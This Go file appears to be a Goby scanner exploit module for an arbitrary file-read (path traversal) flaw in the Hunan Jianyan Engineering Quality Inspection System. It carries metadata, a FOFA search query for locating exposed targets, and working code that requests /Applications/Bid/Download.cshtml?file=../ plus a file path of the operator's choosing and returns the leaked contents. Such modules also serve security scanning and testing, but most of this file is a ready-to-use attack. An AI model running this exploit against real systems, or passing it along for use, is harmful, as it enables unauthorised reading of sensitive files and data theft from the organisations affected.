package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Hunan Jianyan Engineering Quality Inspection System /Applications/Bid/Download.cshtml File Read Vulnerability",
    "Description": "<p>Hunan Jianyan Testing System is a system used for monitoring and managing product quality. It helps enterprises improve product quality, reduce quality problems and risks, and provide data support for decision-making and improvement by testing and analyzing products</p><p>There is an arbitrary file reading vulnerability in the Download interface of Hunan Jianyan Testing System. Attackers can read sensitive files in the system by constructing specific requests, which may lead to sensitive information leakage and pose a threat to system security.</p>",
    "Product": "Hunan Jianyan Engineering Quality Inspection System",
    "Homepage": "http://www.jyvjd.com/",
    "DisclosureDate": "2024-11-21",
    "PostTime": "2024-11-21",
    "Author": "1638690747@qq.com",
    "FofaQuery": "body=\"/Content/Theme/Standard\" && body=\"/webSite/login.css\"",
    "GobyQuery": "body=\"/Content/Theme/Standard\" && body=\"/webSite/login.css\"",
    "Level": "2",
    "Impact": "<p>Vulnerabilities allow attackers to read any file in the system, leading to the leakage of sensitive information, which may be further used for other attacks and pose a threat to system security.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p> 2. If not necessary, prohibit public network access to the system. </p>",
    "References": [
        "https://blog.csdn.net/qq_44905116/article/details/140430184"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "packages,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "packages.config",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "湖南建研工程质量检测系统 /Applications/Bid/Download.cshtml 文件读取漏洞",
            "Product": "湖南建研质量检测系统",
            "Description": "<p>湖南建研检测系统是一种用于监控和管理产品质量的系统,它通过对产品进行检测和分析,帮助企业提高产品质量,减少质量问题和风险,并提供数据支持用于决策和改进<br></p><p>湖南建研检测系统的Download接口存在任意文件读取漏洞。攻击者可以通过构造特定的请求读取系统中的敏感文件，可能导致敏感信息泄露，对系统安全造成威胁。<br></p>",
            "Recommendation": "<p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。&nbsp;</p><p>2、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>漏洞允许攻击者读取系统中的任意文件，导致敏感信息泄露，进一步可能被用于其他攻击，危害系统安全。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Hunan Jianyan Engineering Quality Inspection System /Applications/Bid/Download.cshtml File Read Vulnerability",
            "Product": "Hunan Jianyan Engineering Quality Inspection System",
            "Description": "<p>Hunan Jianyan Testing System is a system used for monitoring and managing product quality. It helps enterprises improve product quality, reduce quality problems and risks, and provide data support for decision-making and improvement by testing and analyzing products<br></p><p>There is an arbitrary file reading vulnerability in the Download interface of Hunan Jianyan Testing System. Attackers can read sensitive files in the system by constructing specific requests, which may lead to sensitive information leakage and pose a threat to system security.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>&nbsp;2. If not necessary, prohibit public network access to the system.&nbsp;<br></p>",
            "Impact": "<p>Vulnerabilities allow attackers to read any file in the system, leading to the leakage of sensitive information, which may be further used for other attacks and pose a threat to system security.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "EditType": "fast",
    "Variables": {},
    "PocId": "9973"
}`

	postOrGet_HnZMW1aZw := func(hostInfo *httpclient.FixUrl, filePath string) (string, error) {
		respTxt := ""
		URLPath := "/Applications/Bid/Download.cshtml?file=../"
		getRequestConfig := httpclient.NewGetRequestConfig(URLPath + filePath)
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		//请求
		response, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)

		if err != nil || response == nil {
			return "", err
		}
		respTxt = response.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/Applications/Bid/Download.cshtml?file=../packages.config"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"packages.config": "Microsoft.AspNet.WebPages.zh-Hans",
			}
			// 函数继承
			fileReadFunc := postOrGet_HnZMW1aZw

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for filePath, fileText := range defaultModeMap {
				resp, err := fileReadFunc(u, filePath)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])
			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"packages": {"packages.config", "Microsoft.AspNet.WebPages.zh-Hans"},
			}
			// 此处需要修改：函数继承
			fileReadFunc := postOrGet_HnZMW1aZw

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := fileReadFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
